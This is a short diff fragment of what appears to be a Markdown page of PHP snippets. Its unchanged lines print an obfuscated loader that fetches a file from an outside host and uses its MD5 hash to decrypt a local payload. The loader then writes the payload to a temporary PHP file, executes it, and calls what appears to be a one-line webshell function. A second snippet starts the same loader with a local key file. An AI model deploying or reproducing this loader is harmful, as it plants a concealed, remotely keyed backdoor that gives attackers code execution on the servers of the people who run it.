@@ -10,11 +10,6 @@
 
 ```
 $a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css');$b=md5($a,true);$c=file_get_contents('../../../../encrypted.bin');$d=base64_decode($c);$e='aes-256-cbc';$f=openssl_cipher_iv_length($e);$g=substr($d,0,$f);$h=substr($d,$f);$i=openssl_decrypt($h,$e,$b,OPENSSL_RAW_DATA,$g);$j=sys_get_temp_dir();$k=$j.'/func_'.uniqid().'.php';file_put_contents($k,"<?phpn".$i);include $k;unlink($k);yijuhua();
-```
-
-
-
-```
 <?php
 $a=file_get_contents('./蜂蜜锅底.css');
 $b=md5($a,true);
